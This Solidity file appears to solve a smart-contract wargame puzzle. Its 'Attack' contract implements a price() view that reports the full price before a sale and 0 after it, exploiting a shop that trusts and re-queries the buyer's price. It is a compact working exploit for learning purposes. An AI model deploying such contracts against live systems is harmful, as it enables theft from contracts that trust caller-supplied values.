//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract Attack {
    IShop immutable shop;
    
    constructor(IShop _shop) payable {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : shop.price();
    }

    function buy() external {
        shop.buy();
    }
}


















